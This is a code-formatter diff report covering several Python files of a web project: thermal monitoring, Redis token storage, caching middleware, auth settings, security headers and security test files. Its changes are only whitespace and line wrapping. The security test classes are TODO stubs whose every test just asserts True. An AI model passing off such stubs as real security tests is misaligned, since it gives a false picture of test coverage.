     def get_system_usage(self) -> Tuple[float, Optional[float]]:
         """Get current CPU and GPU usage percentages"""
         cpu_usage = psutil.cpu_percent(interval=1)
         gpu_usage = None
-        
-        try:
-            result = subprocess.run([
-                'nvidia-smi', '--query-gpu=utilization.gpu',
-                '--format=csv,noheader,nounits'
-            ], capture_output=True, text=True, timeout=5)
-            
+
+        try:
+            result = subprocess.run(
+                [
+                    "nvidia-smi",
+                    "--query-gpu=utilization.gpu",
+                    "--format=csv,noheader,nounits",
+                ],
+                capture_output=True,
+                text=True,
+                timeout=5,
+            )
+
             if result.returncode == 0:
                 usage_str = result.stdout.strip()
                 if usage_str and usage_str.isdigit():
                     gpu_usage = float(usage_str)
         except Exception:
             pass
-        
+
         return cpu_usage, gpu_usage
 
     def apply_gpu_throttling(self, throttle_level: float = 0.7) -> bool:
         """
         Apply GPU throttling to reduce temperature
-        
+
         Args:
             throttle_level: Throttling level (0.0 to 1.0, where 1.0 is no throttling)
-        
+
         Returns:
             bool: True if throttling was applied successfully
         """
         try:
             # Calculate power limit based on throttle level
             # Typical GPU power limits: 150W-300W, throttle to 70% for safety
             power_limit = int(200 * throttle_level)  # Conservative 200W base
-            
-            result = subprocess.run([
-                'nvidia-smi', '-pl', str(power_limit)
-            ], capture_output=True, text=True, timeout=10)
-            
+
+            result = subprocess.run(
+                ["nvidia-smi", "-pl", str(power_limit)],
+                capture_output=True,
+                text=True,
+                timeout=10,
+            )
+
             if result.returncode == 0:
                 logger.warning(f"GPU throttling applied: {power_limit}W power limit")
                 self.throttling_active = True
                 return True
             else:
                 logger.error(f"Failed to apply GPU throttling: {result.stderr}")
-                
+
         except Exception as e:
             logger.error(f"Error applying GPU throttling: {e}")
-        
+
         return False
 
     def remove_gpu_throttling(self) -> bool:
         """Remove GPU throttling and restore normal operation"""
         try:
             # Reset to default power limit (usually maximum)
-            result = subprocess.run([
-                'nvidia-smi', '-pl', '300'  # Conservative maximum
-            ], capture_output=True, text=True, timeout=10)
-            
+            result = subprocess.run(
+                ["nvidia-smi", "-pl", "300"],  # Conservative maximum
+                capture_output=True,
+                text=True,
+                timeout=10,
+            )
+
             if result.returncode == 0:
                 logger.info("GPU throttling removed - normal operation restored")
                 self.throttling_active = False
                 return True
             else:
                 logger.error(f"Failed to remove GPU throttling: {result.stderr}")
-                
+
         except Exception as e:
             logger.error(f"Error removing GPU throttling: {e}")
-        
+
         return False
 
     async def take_reading(self) -> ThermalReading:
         """Take a complete thermal reading"""
         cpu_temp = self.get_cpu_temperature()
         gpu_temp = self.get_gpu_temperature()
         cpu_usage, gpu_usage = self.get_system_usage()
-        
+
         reading = ThermalReading(
             timestamp=datetime.now(),
             cpu_temp=cpu_temp or 0.0,
             gpu_temp=gpu_temp,
             cpu_usage=cpu_usage,
             gpu_usage=gpu_usage,
-            throttling_active=self.throttling_active
+            throttling_active=self.throttling_active,
         )
-        
+
         # Store reading in history
         self.readings_history.append(reading)
         if len(self.readings_history) > self.max_history_size:
             self.readings_history.pop(0)
-        
+
         return reading
 
     async def check_thermal_status(self, reading: ThermalReading) -> None:
         """Check thermal status and apply throttling if needed"""
         # Check CPU temperature
         if reading.cpu_temp >= self.cpu_critical_temp:
-            logger.critical(f"CRITICAL CPU TEMPERATURE: {reading.cpu_temp}C - System protection needed!")
+            logger.critical(
+                f"CRITICAL CPU TEMPERATURE: {reading.cpu_temp}C - System protection needed!"
+            )
             # In critical situations, we might need to throttle CPU as well
-            
+
         elif reading.cpu_temp >= self.cpu_warning_temp:
             logger.warning(f"High CPU temperature: {reading.cpu_temp}C")
-        
+
         # Check GPU temperature and apply throttling
         if reading.gpu_temp is not None:
             if reading.gpu_temp >= self.gpu_critical_temp:
                 if not self.throttling_active:
-                    logger.critical(f"CRITICAL GPU TEMPERATURE: {reading.gpu_temp}C - Applying emergency throttling!")
+                    logger.critical(
+                        f"CRITICAL GPU TEMPERATURE: {reading.gpu_temp}C - Applying emergency throttling!"
+                    )
                     self.apply_gpu_throttling(0.5)  # Aggressive throttling
-                    
+
             elif reading.gpu_temp >= self.gpu_warning_temp:
                 if not self.throttling_active:
-                    logger.warning(f"High GPU temperature: {reading.gpu_temp}C - Applying preventive throttling")
+                    logger.warning(
+                        f"High GPU temperature: {reading.gpu_temp}C - Applying preventive throttling"
+                    )
                     self.apply_gpu_throttling(0.7)  # Moderate throttling
-                    
+
             elif reading.gpu_temp < self.gpu_warning_temp - 5:  # 5C hysteresis
                 if self.throttling_active:
-                    logger.info(f"GPU temperature normalized: {reading.gpu_temp}C - Removing throttling")
+                    logger.info(
+                        f"GPU temperature normalized: {reading.gpu_temp}C - Removing throttling"
+                    )
                     self.remove_gpu_throttling()
 
     async def monitoring_loop(self) -> None:
         """Main monitoring loop"""
         logger.info("Thermal monitoring started")
-        
+
         while self.is_monitoring:
             try:
                 reading = await self.take_reading()
                 await self.check_thermal_status(reading)
-                
+
                 # Log status every 10 readings (50 seconds by default)
                 if len(self.readings_history) % 10 == 0:
-                    gpu_info = f", GPU: {reading.gpu_temp}C" if reading.gpu_temp else ""
+                    gpu_info = (
+                        f", GPU: {reading.gpu_temp}C" if reading.gpu_temp else ""
+                    )
                     throttle_info = " [THROTTLED]" if reading.throttling_active else ""
-                    logger.info(f"Thermal status - CPU: {reading.cpu_temp}C{gpu_info}{throttle_info}")
-                
+                    logger.info(
+                        f"Thermal status - CPU: {reading.cpu_temp}C{gpu_info}{throttle_info}"
+                    )
+
                 await asyncio.sleep(self.monitoring_interval)
-                
+
             except Exception as e:
                 logger.error(f"Error in monitoring loop: {e}")
                 await asyncio.sleep(self.monitoring_interval)
 
     async def start_monitoring(self) -> None:
         """Start thermal monitoring"""
         if self.is_monitoring:
             logger.warning("Thermal monitoring already active")
             return
-        
+
         self.is_monitoring = True
         self.monitor_task = asyncio.create_task(self.monitoring_loop())
         logger.info("Thermal monitoring task started")
 
     async def stop_monitoring(self) -> None:
         """Stop thermal monitoring"""
         if not self.is_monitoring:
             return
-        
+
         self.is_monitoring = False
         if self.monitor_task:
             self.monitor_task.cancel()
             try:
                 await self.monitor_task
             except asyncio.CancelledError:
                 pass
-        
+
         # Remove any active throttling
         if self.throttling_active:
             self.remove_gpu_throttling()
-        
+
         logger.info("Thermal monitoring stopped")
 
     def get_status_report(self) -> Dict:
         """Get current thermal status report"""
         if not self.readings_history:
             return {"status": "no_data", "message": "No thermal readings available"}
-        
+
         latest = self.readings_history[-1]
-        
+
         return {
             "timestamp": latest.timestamp.isoformat(),
             "cpu_temperature": latest.cpu_temp,
             "gpu_temperature": latest.gpu_temp,
             "cpu_usage": latest.cpu_usage,
             "gpu_usage": latest.gpu_usage,
             "throttling_active": latest.throttling_active,
-            "status": "critical" if (latest.cpu_temp >= self.cpu_critical_temp or 
-                                   (latest.gpu_temp and latest.gpu_temp >= self.gpu_critical_temp)) else
-                     "warning" if (latest.cpu_temp >= self.cpu_warning_temp or 
-                                  (latest.gpu_temp and latest.gpu_temp >= self.gpu_warning_temp)) else "normal",
-            "readings_count": len(self.readings_history)
+            "status": (
+                "critical"
+                if (
+                    latest.cpu_temp >= self.cpu_critical_temp
+                    or (latest.gpu_temp and latest.gpu_temp >= self.gpu_critical_temp)
+                )
+                else (
+                    "warning"
+                    if (
+                        latest.cpu_temp >= self.cpu_warning_temp
+                        or (
+                            latest.gpu_temp and latest.gpu_temp >= self.gpu_warning_temp
+                        )
+                    )
+                    else "normal"
+                )
+            ),
+            "readings_count": len(self.readings_history),
         }
+
 
 # AGENT_INSTRUCTION: Global thermal monitor instance for system-wide use
 thermal_monitor = ThermalMonitor()
+
 
 async def initialize_thermal_monitoring():
     """Initialize and start thermal monitoring system"""
     await thermal_monitor.start_monitoring()
     logger.info("Thermal monitoring system initialized and active")
 
+
 async def shutdown_thermal_monitoring():
     """Shutdown thermal monitoring system"""
     await thermal_monitor.stop_monitoring()
     logger.info("Thermal monitoring system shutdown complete")
+
 
 if __name__ == "__main__":
     # AGENT_CONTEXT: Standalone thermal monitoring execution
     async def main():
         await initialize_thermal_monitoring()
@@ -325,7 +383,7 @@
             await asyncio.sleep(60)
         except KeyboardInterrupt:
             logger.info("Thermal monitoring interrupted by user")
         finally:
             await shutdown_thermal_monitoring()
-    
+
     asyncio.run(main())
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/thermal_monitor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/redis/token_storage.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/redis/token_storage.py	2025-06-19 04:03:56.657100+00:00
@@ -102,11 +102,13 @@
             refresh_key = f"{self.refresh_prefix}{token.refresh_token}"
             await redis_client.set(
                 refresh_key,
                 token.jti,
                 ex=int(
-                    (token.refresh_expires_at - datetime.now(timezone.utc)).total_seconds()
+                    (
+                        token.refresh_expires_at - datetime.now(timezone.utc)
+                    ).total_seconds()
                 ),
             )
 
             logger.debug(f"Stored token {token.jti} for user {token.user_id}")
             return True
@@ -131,19 +133,22 @@
             if not token_data:
                 return None
 
             # Convert string representation back to dictionary
             import ast
+
             # Redis with decode_responses=True returns strings directly
             if isinstance(token_data, bytes):
                 token_data = token_data.decode("utf-8")
             return ast.literal_eval(token_data)
         except Exception as e:
             logger.error(f"Error getting token: {str(e)}")
             return None
 
-    async def get_token_by_refresh(self, refresh_token: str) -> Optional[Dict[str, Any]]:
+    async def get_token_by_refresh(
+        self, refresh_token: str
+    ) -> Optional[Dict[str, Any]]:
         """Get a token by refresh token.
 
         Args:
             refresh_token: Refresh token
 
@@ -199,10 +204,11 @@
             expires_at = token_data.get("expires_at")
 
             if expires_at:
                 # Parse ISO format
                 import dateutil.parser
+
                 expiry_dt = dateutil.parser.parse(expires_at)
                 expiry_seconds = int(
                     (expiry_dt - datetime.now(timezone.utc)).total_seconds()
                 )
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/redis/token_storage.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/performance/response_optimizer.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/performance/response_optimizer.py	2025-06-19 04:03:56.688454+00:00
@@ -19,264 +19,288 @@
 logger = logging.getLogger(__name__)
 
 
 class ResponseCache:
     """Simple in-memory response cache with TTL."""
-    
+
     def __init__(self, max_size: int = 1000, default_ttl: int = 300):
         self.cache: Dict[str, Dict[str, Any]] = {}
         self.max_size = max_size
         self.default_ttl = default_ttl
         self.access_times: Dict[str, float] = {}
-        
+
     def _generate_key(self, request: Request) -> str:
         """Generate cache key from request."""
         # Only cache GET requests
         if request.method != "GET":
             return None
-            
+
         # Skip caching for authenticated requests (for now)
         if "authorization" in request.headers:
             return None
-            
+
         # Generate key from path and query params
         key = f"{request.url.path}?{request.url.query}"
         return key
-        
+
     def get(self, request: Request) -> Optional[Dict[str, Any]]:
         """Get cached response if available and not expired."""
         key = self._generate_key(request)
         if not key or key not in self.cache:
             return None
-            
+
         cached_item = self.cache[key]
-        
+
         # Check if expired
         if time.time() > cached_item["expires_at"]:
             del self.cache[key]
             if key in self.access_times:
                 del self.access_times[key]
             return None
-            
+
         # Update access time
         self.access_times[key] = time.time()
         return cached_item["response"]
-        
-    def set(self, request: Request, response_data: Dict[str, Any], ttl: Optional[int] = None):
+
+    def set(
+        self, request: Request, response_data: Dict[str, Any], ttl: Optional[int] = None
+    ):
         """Cache response data."""
         key = self._generate_key(request)
         if not key:
             return
-            
+
         # Evict oldest items if cache is full
         if len(self.cache) >= self.max_size:
             self._evict_oldest()
-            
+
         ttl = ttl or self.default_ttl
         self.cache[key] = {
             "response": response_data,
             "expires_at": time.time() + ttl,
-            "created_at": time.time()
+            "created_at": time.time(),
         }
         self.access_times[key] = time.time()
-        
+
     def _evict_oldest(self):
         """Evict the least recently accessed item."""
         if not self.access_times:
             return
-            
+
         oldest_key = min(self.access_times.keys(), key=lambda k: self.access_times[k])
         if oldest_key in self.cache:
             del self.cache[oldest_key]
         del self.access_times[oldest_key]
 
 
 class ResponseTimeMonitor:
     """Monitor API response times and track performance metrics."""
-    
+
     def __init__(self, window_size: int = 1000):
         self.response_times: deque = deque(maxlen=window_size)
         self.endpoint_times: Dict[str, deque] = defaultdict(lambda: deque(maxlen=100))
         self.slow_requests: List[Dict[str, Any]] = []
         self.slow_threshold_ms = 200  # 200ms threshold
-        
+
     def record_response_time(self, request: Request, response_time_ms: float):
         """Record response time for monitoring."""
         self.response_times.append(response_time_ms)
-        
+
         # Track by endpoint
         endpoint = f"{request.method} {request.url.path}"
         self.endpoint_times[endpoint].append(response_time_ms)
-        
+
         # Track slow requests
         if response_time_ms > self.slow_threshold_ms:
-            self.slow_requests.append({
-                "endpoint": endpoint,
-                "response_time_ms": response_time_ms,
-                "timestamp": datetime.utcnow().isoformat(),
-                "query_params": str(request.query_params),
-                "user_agent": request.headers.get("user-agent", "unknown")
-            })
-            
+            self.slow_requests.append(
+                {
+                    "endpoint": endpoint,
+                    "response_time_ms": response_time_ms,
+                    "timestamp": datetime.utcnow().isoformat(),
+                    "query_params": str(request.query_params),
+                    "user_agent": request.headers.get("user-agent", "unknown"),
+                }
+            )
+
             # Keep only recent slow requests
             if len(self.slow_requests) > 100:
                 self.slow_requests = self.slow_requests[-100:]
-                
+
     def get_stats(self) -> Dict[str, Any]:
         """Get performance statistics."""
         if not self.response_times:
             return {"message": "No data available"}
-            
+
         times = list(self.response_times)
         times.sort()
-        
+
         return {
             "total_requests": len(times),
             "avg_response_time_ms": sum(times) / len(times),
             "median_response_time_ms": times[len(times) // 2],
-            "p95_response_time_ms": times[int(len(times) * 0.95)] if len(times) > 20 else times[-1],
-            "p99_response_time_ms": times[int(len(times) * 0.99)] if len(times) > 100 else times[-1],
-            "slow_requests_count": len([t for t in times if t > self.slow_threshold_ms]),
+            "p95_response_time_ms": (
+                times[int(len(times) * 0.95)] if len(times) > 20 else times[-1]
+            ),
+            "p99_response_time_ms": (
+                times[int(len(times) * 0.99)] if len(times) > 100 else times[-1]
+            ),
+            "slow_requests_count": len(
+                [t for t in times if t > self.slow_threshold_ms]
+            ),
             "fastest_response_ms": min(times),
-            "slowest_response_ms": max(times)
+            "slowest_response_ms": max(times),
         }
 
 
 class ResponseOptimizationMiddleware(BaseHTTPMiddleware):
     """Middleware for response optimization including caching and compression."""
-    
+
     def __init__(
         self,
         app,
         enable_caching: bool = True,
         enable_compression: bool = True,
         cache_size: int = 1000,
         cache_ttl: int = 300,
-        compression_threshold: int = 1024
+        compression_threshold: int = 1024,
     ):
         super().__init__(app)
         self.enable_caching = enable_caching
         self.enable_compression = enable_compression
         self.compression_threshold = compression_threshold
-        
+
         # Initialize cache and monitor
-        self.cache = ResponseCache(max_size=cache_size, default_ttl=cache_ttl) if enable_caching else None
+        self.cache = (
+            ResponseCache(max_size=cache_size, default_ttl=cache_ttl)
+            if enable_caching
+            else None
+        )
         self.monitor = ResponseTimeMonitor()
-        
+
         # Cacheable endpoints (GET requests only)
         self.cacheable_paths = {
             "/api/v1/products",
-            "/api/v1/categories", 
+            "/api/v1/categories",
             "/api/v1/health",
-            "/api/v1/analytics/dashboard"
+            "/api/v1/analytics/dashboard",
         }
-        
+
         # Compressible content types
         self.compressible_types = {
             "application/json",
             "text/html",
             "text/css",
             "text/javascript",
-            "application/javascript"
+            "application/javascript",
         }
-        
+
     async def dispatch(self, request: Request, call_next) -> Response:
         """Process request with optimization."""
         start_time = time.time()
-        
+
         # Try cache first (for GET requests)
         if self.enable_caching and self.cache and request.method == "GET":
             cached_response = self.cache.get(request)
             if cached_response:
                 response = JSONResponse(content=cached_response)
                 response.headers["X-Cache"] = "HIT"
-                
+
                 # Record cache hit time
                 response_time_ms = (time.time() - start_time) * 1000
                 self.monitor.record_response_time(request, response_time_ms)
                 response.headers["X-Response-Time"] = f"{response_time_ms:.2f}ms"
-                
+
                 return response
-        
+
         # Process request
         response = await call_next(request)
         response_time_ms = (time.time() - start_time) * 1000
-        
+
         # Record response time
         self.monitor.record_response_time(request, response_time_ms)
         response.headers["X-Response-Time"] = f"{response_time_ms:.2f}ms"
-        
+
         # Cache successful GET responses
-        if (self.enable_caching and self.cache and 
-            request.method == "GET" and 
-            response.status_code == 200 and
-            any(path in request.url.path for path in self.cacheable_paths)):
-            
+        if (
+            self.enable_caching
+            and self.cache
+            and request.method == "GET"
+            and response.status_code == 200
+            and any(path in request.url.path for path in self.cacheable_paths)
+        ):
+
             try:
                 # Only cache JSON responses
-                if response.headers.get("content-type", "").startswith("application/json"):
+                if response.headers.get("content-type", "").startswith(
+                    "application/json"
+                ):
                     response_body = b""
                     async for chunk in response.body_iterator:
                         response_body += chunk
-                    
+
                     response_data = json.loads(response_body.decode())
                     self.cache.set(request, response_data)
                     response.headers["X-Cache"] = "MISS"
-                    
+
                     # Recreate response with cached data
                     response = JSONResponse(content=response_data)
                     response.headers["X-Cache"] = "MISS"
                     response.headers["X-Response-Time"] = f"{response_time_ms:.2f}ms"
-                    
+
             except Exception as e:
                 logger.warning(f"Failed to cache response: {e}")
-        
+
         # Apply compression if enabled and beneficial
-        if (self.enable_compression and 
-            response.status_code == 200 and
-            "gzip" in request.headers.get("accept-encoding", "") and
-            response.headers.get("content-type", "").split(";")[0] in self.compressible_types):
-            
+        if (
+            self.enable_compression
+            and response.status_code == 200
+            and "gzip" in request.headers.get("accept-encoding", "")
+            and response.headers.get("content-type", "").split(";")[0]
+            in self.compressible_types
+        ):
+
             try:
                 response_body = b""
                 async for chunk in response.body_iterator:
                     response_body += chunk
-                
+
                 # Only compress if above threshold
                 if len(response_body) > self.compression_threshold:
                     compressed_body = gzip.compress(response_body)
-                    
+
                     # Only use compression if it actually reduces size
                     if len(compressed_body) < len(response_body):
                         response.headers["content-encoding"] = "gzip"
                         response.headers["content-length"] = str(len(compressed_body))
-                        
+
                         # Create new response with compressed body
                         response = Response(
                             content=compressed_body,
                             status_code=response.status_code,
                             headers=dict(response.headers),
-                            media_type=response.media_type
+                            media_type=response.media_type,
                         )
-                        response.headers["X-Response-Time"] = f"{response_time_ms:.2f}ms"
-                        
+                        response.headers["X-Response-Time"] = (
+                            f"{response_time_ms:.2f}ms"
+                        )
+
             except Exception as e:
                 logger.warning(f"Failed to compress response: {e}")
-        
+
         return response
-    
+
     def get_performance_stats(self) -> Dict[str, Any]:
         """Get performance statistics."""
         stats = self.monitor.get_stats()
-        
+
         if self.cache:
             stats["cache"] = {
                 "size": len(self.cache.cache),
                 "max_size": self.cache.max_size,
-                "hit_rate": "N/A"  # Would need to track hits/misses
+                "hit_rate": "N/A",  # Would need to track hits/misses
             }
-            
+
         return stats
 
 
 # Factory functions for different environments
 def create_production_optimizer() -> ResponseOptimizationMiddleware:
@@ -285,11 +309,11 @@
         app=None,
         enable_caching=True,
         enable_compression=True,
         cache_size=2000,
         cache_ttl=600,  # 10 minutes
-        compression_threshold=512
+        compression_threshold=512,
     )
 
 
 def create_development_optimizer() -> ResponseOptimizationMiddleware:
     """Create development-friendly middleware."""
@@ -297,7 +321,7 @@
         app=None,
         enable_caching=False,  # Disable caching in development
         enable_compression=False,  # Disable compression in development
         cache_size=100,
         cache_ttl=60,
-        compression_threshold=1024
+        compression_threshold=1024,
     )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/performance/response_optimizer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/auth.py	2025-06-16 04:23:21.916446+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/auth.py	2025-06-19 04:03:56.708114+00:00
@@ -27,11 +27,13 @@
 ALGORITHM = os.getenv("JWT_ALGORITHM", "HS256")
 SECRET_KEY = os.getenv("JWT_SECRET")  # Must be set in environment variables
 
 # Validate that JWT_SECRET is set
 if not SECRET_KEY:
-    logger.error("JWT_SECRET environment variable is not set! This is a critical security issue.")
+    logger.error(
+        "JWT_SECRET environment variable is not set! This is a critical security issue."
+    )
     raise ValueError("JWT_SECRET environment variable must be set for security")
 
 
 def get_auth_service(request: Request) -> AuthService:
     """Get the authentication service from the application state.
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/auth.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/security_headers.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/security_headers.py	2025-06-19 04:03:56.877776+00:00
@@ -19,73 +19,76 @@
     "X-Frame-Options": "DENY",
     "X-XSS-Protection": "1; mode=block",
     "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
     "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'",
     "Referrer-Policy": "strict-origin-when-cross-origin",
-    "Permissions-Policy": "geolocation=(), microphone=(), camera=()"
+    "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
 }
 
 
 class SecurityHeadersMiddleware(BaseHTTPMiddleware):
     """
     Middleware to add security headers to all responses.
-    
+
     This middleware adds various security headers to HTTP responses to enhance
     security by preventing common web vulnerabilities like XSS, clickjacking, etc.
     """
-    
+
     def __init__(
         self,
         app: ASGIApp,
         hsts: Optional[Union[str, bool]] = None,
         csp: Optional[str] = None,
         headers: Optional[Dict[str, str]] = None,
     ):
         """
         Initialize the security headers middleware.
-        
+
         Args:
             app: The ASGI application
             hsts: HSTS header value or True to use default (disable with False/None)
             csp: Content-Security-Policy value (uses default if None)
             headers: Additional headers to add/override defaults
         """
         super().__init__(app)
-        
+
         # Start with default headers
         self.headers = DEFAULT_SECURITY_HEADERS.copy()
-        
+
         # Override with custom headers if provided
         if headers:
             self.headers.update(headers)
-            
+
         # Handle HSTS configuration
         if hsts is False or hsts is None:
             self.headers.pop("Strict-Transport-Security", None)
         elif isinstance(hsts, str):
             self.headers["Strict-Transport-Security"] = hsts
-            
+
         # Handle CSP configuration
         if csp:
             self.headers["Content-Security-Policy"] = csp
-            
-        logger.info("SecurityHeadersMiddleware initialized with headers: %s", list(self.headers.keys()))
-    
+
+        logger.info(
+            "SecurityHeadersMiddleware initialized with headers: %s",
+            list(self.headers.keys()),
+        )
+
     async def dispatch(self, request: Request, call_next: Callable) -> Response:
         """
         Dispatch the middleware.
-        
+
         Add security headers to the response.
         """
         # Process the request and get the response
         response = await call_next(request)
-        
+
         # Add security headers to the response
         for header_name, header_value in self.headers.items():
             response.headers[header_name] = header_value
-        
+
         # For API routes, ensure proper content type
         if request.url.path.startswith("/api/"):
             if "Content-Type" not in response.headers:
                 response.headers["Content-Type"] = "application/json"
-        
+
         return response
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/security_headers.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/test___init__.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/test___init__.py	2025-06-19 04:03:56.937178+00:00
@@ -12,45 +12,47 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from __init__ import *
 
+
 class TestInitSecurity:
     """Security test class for __init__."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_security_functionality(self):
         """Test security functionality."""
         # TODO: Add security-specific functionality tests
         assert True
-    
+
     def test_encryption_security(self):
         """Test encryption security if applicable."""
         # TODO: Add encryption security tests
         assert True
-    
+
     def test_authentication_security(self):
         """Test authentication security if applicable."""
         # TODO: Add authentication security tests
         assert True
-    
+
     def test_access_control(self):
         """Test access control mechanisms."""
         # TODO: Add access control tests
         assert True
-    
+
     def test_input_validation(self):
         """Test input validation and sanitization."""
         # TODO: Add input validation tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for security
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_access_control.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_access_control.py	2025-06-19 04:03:56.948174+00:00
@@ -12,45 +12,47 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from access_control import *
 
+
 class TestAccessControlSecurity:
     """Security test class for access_control."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_security_functionality(self):
         """Test security functionality."""
         # TODO: Add security-specific functionality tests
         assert True
-    
+
     def test_encryption_security(self):
         """Test encryption security if applicable."""
         # TODO: Add encryption security tests
         assert True
-    
+
     def test_authentication_security(self):
         """Test authentication security if applicable."""
         # TODO: Add authentication security tests
         assert True
-    
+
     def test_access_control(self):
         """Test access control mechanisms."""
         # TODO: Add access control tests
         assert True
-    
+
     def test_input_validation(self):
         """Test input validation and sanitization."""
         # TODO: Add input validation tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for security
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/test___init__.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_access_control.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_database_security.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_database_security.py	2025-06-19 04:03:56.988422+00:00
@@ -12,45 +12,47 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from database_security import *
 
+
 class TestDatabaseSecuritySecurity:
     """Security test class for database_security."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_security_functionality(self):
         """Test security functionality."""
         # TODO: Add security-specific functionality tests
         assert True
-    
+
     def test_encryption_security(self):
         """Test encryption security if applicable."""
         # TODO: Add encryption security tests
         assert True
-    
+
     def test_authentication_security(self):
         """Test authentication security if applicable."""
         # TODO: Add authentication security tests
         assert True
-    
+
     def test_access_control(self):
         """Test access control mechanisms."""
         # TODO: Add access control tests
         assert True
-    
+
     def test_input_validation(self):
         """Test input validation and sanitization."""
         # TODO: Add input validation tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for security
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_database_security.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_encryption_service.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_encryption_service.py	2025-06-19 04:03:57.019746+00:00
@@ -12,45 +12,47 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from encryption_service import *
 
+
 class TestEncryptionServiceSecurity:
     """Security test class for encryption_service."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_security_functionality(self):
         """Test security functionality."""
         # TODO: Add security-specific functionality tests
         assert True
-    
+
     def test_encryption_security(self):
         """Test encryption security if applicable."""
         # TODO: Add encryption security tests
         assert True
-    
+
     def test_authentication_security(self):
         """Test authentication security if applicable."""
         # TODO: Add authentication security tests
         assert True
-    
+
     def test_access_control(self):
         """Test access control mechanisms."""
         # TODO: Add access control tests
         assert True
-    
+
     def test_input_validation(self):
         """Test input validation and sanitization."""
         # TODO: Add input validation tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for security
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_encryption_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_auth.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_auth.py	2025-06-19 04:03:57.020013+00:00
@@ -12,45 +12,47 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from auth import *
 
+
 class TestAuthSecurity:
     """Security test class for auth."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_security_functionality(self):
         """Test security functionality."""
         # TODO: Add security-specific functionality tests
         assert True
-    
+
     def test_encryption_security(self):
         """Test encryption security if applicable."""
         # TODO: Add encryption security tests
         assert True
-    
+
     def test_authentication_security(self):
         """Test authentication security if applicable."""
         # TODO: Add authentication security tests
         assert True
-    
+
     def test_access_control(self):
         """Test access control mechanisms."""
         # TODO: Add access control tests
         assert True
-    
+
     def test_input_validation(self):
         """Test input validation and sanitization."""
         # TODO: Add input validation tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for security
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_auth.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_message_security.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_message_security.py	2025-06-19 04:03:57.069468+00:00
@@ -12,45 +12,47 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from message_security import *
 
+
 class TestMessageSecuritySecurity:
     """Security test class for message_security."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_security_functionality(self):
         """Test security functionality."""
         # TODO: Add security-specific functionality tests
         assert True
-    
+
     def test_encryption_security(self):
         """Test encryption security if applicable."""
         # TODO: Add encryption security tests
         assert True
-    
+
     def test_authentication_security(self):
         """Test authentication security if applicable."""
